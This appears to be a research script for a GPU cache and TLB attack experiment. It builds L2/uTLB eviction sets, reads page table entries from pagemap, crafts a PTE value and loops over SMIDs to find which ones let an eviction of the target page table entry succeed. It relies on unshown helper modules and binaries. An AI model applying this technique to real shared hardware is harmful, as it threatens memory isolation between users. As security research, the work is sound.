#!/usr/bin/python3

import subprocess
import time
import pagemap
import random
from run_util import *
from l2_set import get_eviction_set

eviction_set = get_eviction_set(18, n=6, indexed=True)
target = eviction_set[0]
# eviction_set[2] += 10
eviction_set = list(map(str, eviction_set))
print(eviction_set)

smid1_base_address = 0x700200000000
num = 16
eviction_set_attacker = get_eviction_set(18, n=num, indexed=True, base_address=smid1_base_address)
with open("./eviction_set_smid1.txt", "w") as f:
    for idx in eviction_set_attacker:
        f.write(str(idx) + "\n")
print(get_eviction_set(18, n=num, base_address=smid1_base_address))

target_va = target_va + target * (1 * 1024 * 1024)

cmd = ["./l2-utlb-set-static", "1"] + eviction_set
print(f"[*] cmd: {' '.join(cmd)}")
prepare(cmd, sleep_time=3)
ptes = pagemap.retrieve_ptes(tmp_path + 'pagemap')
print(f"[*] target_va: {hex(target_va)}")
pte_pa = ptes[target_va][1]
pte_val = pagemap.make_pte_value(ptes[dummy_va][0])

valid_smids = []

for SMID1 in range(1, 56):
    cmd = ["./l2-utlb-set-static", str(SMID1)] + eviction_set
    print(f"[*] cmd: {' '.join(cmd)}")
    # prepare(cmd, sleep_time=3)
    time.sleep(3)

    # extract PTEs from the pagemap

    if launch_eviction(cmd, pte_pa, pte_val, sleep_time=10):
        valid_smids.append(SMID1)
        print(f"[*] valid: {valid_smids}")

print(valid_smids)

